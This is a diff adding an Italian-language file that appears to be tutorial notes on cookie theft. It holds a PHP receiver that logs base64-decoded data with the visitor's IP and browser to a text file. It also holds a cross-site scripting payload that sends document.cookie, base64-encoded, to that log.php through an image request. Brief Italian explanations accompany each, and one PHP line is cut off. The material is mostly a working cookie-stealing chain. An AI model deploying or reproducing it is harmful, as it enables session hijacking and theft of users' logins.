@@ -1,0 +1,46 @@
+?php
+if(isset($_REQUEST['q'])) {
+    $client_ip = $_SERVER['REMOTE_ADDR'];
+    $decoded_data = base64_decode($_REQUEST['q']);
+
+    if($decoded_data !== false) {
+        $current_timestamp = date('Y-m-d\TH:i:sP');
+        $browserAgent = $_SERVER['HTTP_USER_AGENT'];
+        $file_path = '/var/www/html/utenti/sgamed.txt';
+        
+        // Verifica se i dati decodificati sono diversi da false prima di salvare nel file
+        if($decoded_data !== false) {
+            $write_success = file_put_contents($file_path, "IP: $client_ip\nData: $decoded_data\nInfo Broswer: $brow>
+
+            if($write_success !== false) {
+                echo "I dati sono stati salvati correttamente.";
+            } else {
+                echo "Si è verificato un errore durante il salvataggio dei dati.";
+            }
+        } else {
+            echo "I dati inviati non sono validi.";
+        }
+    } else {
+        echo "I dati inviati non sono validi.";
+    }
+} else {
+    echo "Parametro 'q' mancante nella richiesta.";
+}
+?>
+
+Cosa fa questo codice in php?
+- Controlla se il parametro 'q' è presente nella richiesta.
+- Ottiene l'indirizzo IP del client che ha inviato la richiesta.
+- Decodifica il parametro 'q' dal formato Base64.
+- Verifica se la decodifica è avvenuta con successo.
+- Se la decodifica ha avuto successo, ottiene il timestamp corrente e l'agente utente del browser.
+- Specifica il percorso del file in cui verranno salvati i dati.
+- Se i dati decodificati sono validi, li salva nel file insieme all'indirizzo IP e alle informazioni del browser.
+Stampa un messaggio appropriato a seconda dell'esito del salvataggio.
+
+
+<script>var i = new Image(); i.src='http://localhost/log.php?q='+btoa(document.cookie)</script>
+
+Questo è un esempio di script JavaScript che crea un nuovo oggetto immagine (Image) e imposta la sua proprietà src su un URL che punta a un server locale (http://localhost/log.php). Inoltre, questo script invia i cookie del documento alla pagina log.php del server locale codificati in Base64.
+
+In altre parole, quando questo script viene eseguito in una pagina web, invierà i cookie del documento alla pagina log.php del server locale. Questo potrebbe essere usato per il tracciamento o per rubare informazioni sensibili come le sessioni utente.
